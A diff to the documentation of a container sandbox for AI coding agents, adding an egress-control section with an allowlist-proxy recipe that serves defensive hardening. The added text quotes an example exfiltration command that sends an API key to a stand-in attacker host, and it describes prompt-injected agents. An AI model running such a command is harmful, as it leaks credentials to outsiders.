@@ -97,6 +97,30 @@ docker({ hardening: { capAdd: ["NET_BIND_SERVICE"], memory: "8g" } });
 
 **Host-access escape hatches are gated.** A few provider options deliberately punch a hole in the container boundary — `network: "host"` (shares the host network namespace), `groups` (`--group-add`), `devices` (`--device`), and mounting the Docker/Podman socket via `mounts` (Docker-outside-of-Docker). These remain legitimate opt-in features (GPU access, DooD), but each grants the agent host-level access, so they are **inert unless you also pass `allowDangerousHostAccess: true`** — setting one without the acknowledgment throws at construction, so a prompt-injected agent can't reach the host through an option set by accident. Mounting the container-runtime socket additionally logs a runtime warning on every run; where DooD is genuinely needed, prefer a read-only socket-proxy over the raw socket. Custom/proxy networks and `network: "none"` are **not** gated — restricting egress is not a host-access hatch.
 
+**Egress control.** A subverted agent (prompt injection, malicious dependency) can try to exfiltrate the tokens and source it can see — `curl attacker.com/?t=$ANTHROPIC_API_KEY`. Restricting the container's **outbound** network is the control that blocks this, and `network` is the lever. **The default posture is open** — with `network` omitted the container uses the default bridge network, which NATs outbound so the agent reaches `api.anthropic.com`, git hosts, and package registries out of the box. That default is deliberate ([ADR 0021](docs/adr/0021-egress-control-default-open.md)): the agent calls `api.anthropic.com` directly, so a blanket blackout would kill the agent itself. Restriction is opt-in and is the recommendation for untrusted work:
+
+- **Allowlist proxy (recommended for untrusted work).** Attach the container to an **internal** Docker network (no gateway out) plus a filtering forward-proxy that is the only route out and permits only the agent's real endpoints, then point the agent at it:
+
+  ```typescript
+  // One-time host setup (outside Sandcastle):
+  //   docker network create --internal egress-internal
+  //   run your allowlisting forward-proxy (e.g. squid/tinyproxy) with an
+  //   allowlist of api.anthropic.com + your git host + your registries,
+  //   attached to BOTH egress-internal and a normal (outbound) network.
+  docker({
+    network: "egress-internal", // no direct route out — only the proxy can leave
+    env: {
+      HTTPS_PROXY: "http://egress-proxy:3128",
+      HTTP_PROXY: "http://egress-proxy:3128",
+      NO_PROXY: "localhost,127.0.0.1",
+    },
+  });
+  ```
+
+  This leaves the agent fully functional (model calls, installs, git) while `curl attacker.com` is denied by the proxy.
+
+- **`network: "none"` — fully offline.** Cuts all outbound traffic. Usable **only** for tasks that make no model calls, no package installs, and no remote git — it will break any agent that talks to `api.anthropic.com`. Don't reach for it as a general default; it's the offline-only degenerate case.
+
 ```typescript
 import { docker } from "@ai-hero/sandcastle/sandboxes/docker";
 import { podman } from "@ai-hero/sandcastle/sandboxes/podman";
@@ -174,7 +198,8 @@ const result = await run({
     // Optional: provider-level env vars merged at launch time
     env: { DOCKER_SPECIFIC: "value" },
     // Optional: attach container to a custom/proxy Docker network — string or
-    // string[]. This is the egress-control lever (see "Egress control" below).
+    // string[]. This is the egress-control lever (see the "Egress control"
+    // section above for the allowlist-proxy recipe and network: "none").
     // network: "my-egress-proxy-net",
     // Optional: limit CPU resources via --cpus. Fractional values allowed (e.g. 1.5).
     // cpus: 2,
